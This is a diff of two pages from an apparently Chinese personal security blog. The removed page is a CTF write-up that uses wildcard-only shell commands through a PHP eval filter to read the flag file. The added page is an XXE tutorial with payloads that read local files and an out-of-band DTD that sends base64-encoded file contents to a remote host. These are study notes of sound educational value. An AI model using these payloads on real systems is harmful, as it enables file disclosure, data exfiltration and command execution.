@@ -3,23 +3,27 @@
 <head>
   <meta charset="utf-8">
   
-  <title>ctf-极限利用 | sh1llc0de&#39;s blog</title>
+  <title>xxe_学习 | sh1llc0de&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ctf_极限利用 前几天看到安全客上面有一道ctf的文章，然后自己看的一脸蒙蔽，通过一些学习还是学会了。  源码12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;">
-<meta name="keywords" content="CTF">
+  <meta name="description" content="xxe_学习基础学习利用环境月约束 libxml2.9.1(php5.3)之前的版本都默认解析外部 查看方法，编辑一个phpinfo文件，可以直接查看到libxml的版本DTD的基础知识：概念： XXE: XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 DTD:Document Type Definiti">
+<meta name="keywords" content="漏洞挖掘">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctf-极限利用">
-<meta property="og:url" content="http://yoursite.com/2018/08/18/2018-8-18-ctf_极限利用/index.html">
+<meta property="og:title" content="xxe_学习">
+<meta property="og:url" content="http://yoursite.com/2018/08/20/2018-8-20-xxe_学习/index.html">
 <meta property="og:site_name" content="sh1llc0de&#39;s blog">
-<meta property="og:description" content="ctf_极限利用 前几天看到安全客上面有一道ctf的文章，然后自己看的一脸蒙蔽，通过一些学习还是学会了。  源码12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;">
+<meta property="og:description" content="xxe_学习基础学习利用环境月约束 libxml2.9.1(php5.3)之前的版本都默认解析外部 查看方法，编辑一个phpinfo文件，可以直接查看到libxml的版本DTD的基础知识：概念： XXE: XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 DTD:Document Type Definiti">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/18/Pf6FiT.jpg">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/18/Pf6Ez4.jpg">
-<meta property="og:updated_time" content="2018-08-19T05:19:50.000Z">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/Phh9MT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/PhhRyT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/Phhv0e.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/Ph4Skd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/Ph4kX8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/08/20/Ph4Mpq.png">
+<meta property="og:updated_time" content="2018-08-20T09:29:38.810Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ctf-极限利用">
-<meta name="twitter:description" content="ctf_极限利用 前几天看到安全客上面有一道ctf的文章，然后自己看的一脸蒙蔽，通过一些学习还是学会了。  源码12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;">
-<meta name="twitter:image" content="https://s1.ax1x.com/2018/08/18/Pf6FiT.jpg">
+<meta name="twitter:title" content="xxe_学习">
+<meta name="twitter:description" content="xxe_学习基础学习利用环境月约束 libxml2.9.1(php5.3)之前的版本都默认解析外部 查看方法，编辑一个phpinfo文件，可以直接查看到libxml的版本DTD的基础知识：概念： XXE: XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 DTD:Document Type Definiti">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/08/20/Phh9MT.png">
   
   
     <link rel="icon" href="//img/my.jpg">
@@ -255,11 +259,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-2018-8-18-ctf_极限利用" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-2018-8-20-xxe_学习" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/08/18/2018-8-18-ctf_极限利用/" class="article-date">
-      <time datetime="2018-08-17T16:00:00.000Z" itemprop="datePublished">2018-08-18</time>
+      <a href="/2018/08/20/2018-8-20-xxe_学习/" class="article-date">
+      <time datetime="2018-08-19T16:00:00.000Z" itemprop="datePublished">2018-08-20</time>
 </a>
     </div>
   
@@ -272,7 +276,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ctf-极限利用
+      xxe_学习
     </h1>
   
 
@@ -283,7 +287,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -293,21 +297,34 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="ctf-极限利用"><a href="#ctf-极限利用" class="headerlink" title="ctf_极限利用"></a>ctf_极限利用</h1><blockquote>
-<p>前几天看到安全客上面有一道ctf的文章，然后自己看的一脸蒙蔽，通过一些学习还是学会了。</p>
-</blockquote>
-<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
-<li>首先我们传入的值不能有大小写字母和数字</li>
-<li>其次我们传入的值长度不能大于40</li>
+        <h2 id="xxe-学习"><a href="#xxe-学习" class="headerlink" title="xxe_学习"></a>xxe_学习</h2><h3 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h3><h4 id="利用环境月约束"><a href="#利用环境月约束" class="headerlink" title="利用环境月约束"></a>利用环境月约束</h4><ul>
+<li>libxml2.9.1(php5.3)之前的版本都默认解析外部</li>
+<li>查看方法，编辑一个phpinfo文件，可以直接查看到libxml的版本<h4 id="DTD的基础知识："><a href="#DTD的基础知识：" class="headerlink" title="DTD的基础知识："></a>DTD的基础知识：</h4><h5 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h5></li>
+<li>XXE: XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</li>
+<li>DTD:Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</li>
+<li>基本的payload结构:<br><img src="https://s1.ax1x.com/2018/08/20/Phh9MT.png" alt=""><h5 id="使用DTD实体攻击方式"><a href="#使用DTD实体攻击方式" class="headerlink" title="使用DTD实体攻击方式:"></a>使用DTD实体攻击方式:</h5></li>
+<li>DTD引用方式:<br>1、内部声明:&lt;&lt;!DOCTYPE 根元素 [元素声明]&gt;&gt;<br>2、外部声明:&lt;!DOCTYPE 根元素 SYSTEM “外部DTD文档的url” &gt;<br>3、引用公共DTD:&lt;!DOCTYPE 根元素 PUBLIC “DTD标识名” “公共DTD的url” &gt;</li>
+<li><p>DTD实体声明:<br>1、内部实体声明</p>
+<pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot; &gt;
+</code></pre><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号。<br>  实例：</p>
+<pre><code>1.php源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=simplexml_load_string($_POST[&apos;xml&apos;]);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+传入参数:xml=&lt;!DOCTYPE foo [&lt;!ENTITY aaa &quot;test&quot;&gt;]&gt;&lt;foo&gt;%26aaa;&lt;/foo&gt;
+</code></pre><p>  <img src="https://s1.ax1x.com/2018/08/20/PhhRyT.png" alt=""><br>2、外部实体声明</p>
+<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot; &gt;
+</code></pre><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示:<br><img src="https://s1.ax1x.com/2018/08/20/Phhv0e.png" alt=""><br><img src="https://s1.ax1x.com/2018/08/20/Ph4Skd.png" alt=""><br>3、参数实体声明：</p>
+<pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot; &gt; 或 &lt;!ENTITY % 实体名称 &quot;URI&quot; &gt;
+</code></pre><p><img src="https://s1.ax1x.com/2018/08/20/Ph4kX8.png" alt=""><br>4、引用公共实体：</p>
+<pre><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_iD&quot; &quot;URI&quot; &gt;
+</code></pre><h4 id="XXE的利用方式："><a href="#XXE的利用方式：" class="headerlink" title="XXE的利用方式："></a>XXE的利用方式：</h4><h5 id="有回显的情况："><a href="#有回显的情况：" class="headerlink" title="有回显的情况："></a>有回显的情况：</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">2、</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br><span class="line">外部dtd种的内容：</span><br><span class="line">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</span><br></pre></td></tr></table></figure>
+<h5 id="无回显的情况："><a href="#无回显的情况：" class="headerlink" title="无回显的情况："></a>无回显的情况：</h5><blockquote>
+<p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到攻击服务器</p>
+<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">攻击代码：</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1/?data=%file;&apos;&gt;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</code></pre></blockquote>
+</li>
 </ul>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>  首先hint信息提示我们是要通过getflag函数来获取flag，但是本人实力有限，用了安全客的第二种方法，我们可以不执行getflag函数，因为Linux下的一切都是文件，那不如去构造一个读文件，或者命令执行来读flag，思路确定后开始尝试。</p>
-<h3 id="取回结果"><a href="#取回结果" class="headerlink" title="取回结果"></a>取回结果</h3><p>  原作者是说采用&lt;?=$_?&gt;方式来获取，我当时看的反正一脸蒙蔽，在一些大佬的帮助下知道了这个是短标签(原来看到过，记性不好)，&lt;?=也就是等价于&lt;?php echo，当然要使用短标签的话要开启short_open_tag这个选项，这样我们就可以取回结果了。</p>
-<h3 id="如何构造字母？执行命令？"><a href="#如何构造字母？执行命令？" class="headerlink" title="如何构造字母？执行命令？"></a>如何构造字母？执行命令？</h3><p>  原来在p牛的代码审计中的题目看到过可以通过某些值亦或某些值来构造字母，但是还是本人实力的问题。。所以我还是采用了作者的方法，使用通配符来绕过不能是用字母。</p>
-<h3 id="开始尝试"><a href="#开始尝试" class="headerlink" title="开始尝试"></a>开始尝试</h3><p>  首先先尝试一下获取index.php的源码，可以这样构造”?code=$<em>=<code>/???/??? /???/???/????/*</code>;?&gt;&lt;?=$</em>?&gt;”,稍微解释一下，通过给$_赋值我们要执行的命令，然后通过php短标签来执行命令并打印。然后屏幕上应该回显了一大堆的乱码，而我们要的源码在最底部。<br><img src="https://s1.ax1x.com/2018/08/18/Pf6FiT.jpg" alt=""></p>
-<p>  知道源码之后我们发现flag.php是读取的/flag的内容的，按我们直接构造呗”?code=$<em>=<code>/???/??? /????</code>;?&gt;&lt;?=$</em>?&gt;”同样的，我们的flag还是在最底部。<br><img src="https://s1.ax1x.com/2018/08/18/Pf6Ez4.jpg" alt=""></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>  这到题目十分的灵活，让我知道了许多不知道的内容，同时也感谢大佬们的帮助。</p>
-<h3 id="原文地址-https-www-anquanke-com-post-id-154284"><a href="#原文地址-https-www-anquanke-com-post-id-154284" class="headerlink" title="原文地址:    https://www.anquanke.com/post/id/154284"></a>原文地址:    <a href="https://www.anquanke.com/post/id/154284" target="_blank" rel="noopener">https://www.anquanke.com/post/id/154284</a></h3>
+<p>有两种情况：<br>    有报错：<br>        <img src="https://s1.ax1x.com/2018/08/20/Ph4Mpq.png" alt=""><br>    没报错：<br>        这种情况我们就要去查看日志文件了。</p>
+
       
       
     </div>
@@ -316,13 +333,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/08/18/2018-8-18-ctf_极限利用/">ctf-极限利用</a></p>
+        <p><span>本文标题:</span><a href="/2018/08/20/2018-8-20-xxe_学习/">xxe_学习</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 sh1llc0de&#39;s blog 的个人博客">sh1llc0de&#39;s blog</a></p>
-        <p><span>发布时间:</span>2018年08月18日 - 00时00分</p>
-        <p><span>最后更新:</span>2018年08月19日 - 13时19分</p>
+        <p><span>发布时间:</span>2018年08月20日 - 00时00分</p>
+        <p><span>最后更新:</span>2018年08月20日 - 17时29分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/08/18/2018-8-18-ctf_极限利用/" title="ctf-极限利用">http://yoursite.com/2018/08/18/2018-8-18-ctf_极限利用/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/08/18/2018-8-18-ctf_极限利用/　　作者: sh1llc0de&#39;s blog" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/20/2018-8-20-xxe_学习/" title="xxe_学习">http://yoursite.com/2018/08/20/2018-8-20-xxe_学习/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/08/20/2018-8-20-xxe_学习/　　作者: sh1llc0de&#39;s blog" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -335,18 +352,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/08/20/2018-8-20-xxe_学习/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          xxe_学习
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/08/15/2018-8-15-python_生成器/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Python-生成器学习</div>
+    <a href="/2018/08/18/2018-8-18-ctf_极限利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ctf-极限利用</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -357,7 +365,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf-极限利用"><span class="toc-number">1.</span> <span class="toc-text">ctf_极限利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#源码"><span class="toc-number">1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">1.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">1.3.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#取回结果"><span class="toc-number">1.3.1.</span> <span class="toc-text">取回结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何构造字母？执行命令？"><span class="toc-number">1.3.2.</span> <span class="toc-text">如何构造字母？执行命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始尝试"><span class="toc-number">1.3.3.</span> <span class="toc-text">开始尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.3.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原文地址-https-www-anquanke-com-post-id-154284"><span class="toc-number">1.3.5.</span> <span class="toc-text">原文地址:    https://www.anquanke.com/post/id/154284</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe-学习"><span class="toc-number">1.</span> <span class="toc-text">xxe_学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础学习"><span class="toc-number">1.1.</span> <span class="toc-text">基础学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用环境月约束"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用环境月约束</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD的基础知识："><span class="toc-number">1.1.2.</span> <span class="toc-text">DTD的基础知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#概念："><span class="toc-number">1.1.2.1.</span> <span class="toc-text">概念：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用DTD实体攻击方式"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">使用DTD实体攻击方式:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE的利用方式："><span class="toc-number">1.1.3.</span> <span class="toc-text">XXE的利用方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#有回显的情况："><span class="toc-number">1.1.3.1.</span> <span class="toc-text">有回显的情况：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无回显的情况："><span class="toc-number">1.1.3.2.</span> <span class="toc-text">无回显的情况：</span></a></li></ol></li></ol></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -408,13 +416,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/08/20/2018-8-20-xxe_学习/" title="上一篇: xxe_学习">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/08/15/2018-8-15-python_生成器/" title="下一篇: Python-生成器学习">
+            <a href="/2018/08/18/2018-8-18-ctf_极限利用/" title="下一篇: ctf-极限利用">
                 <i class="fa fa-angle-right"></i>
             </a>
         
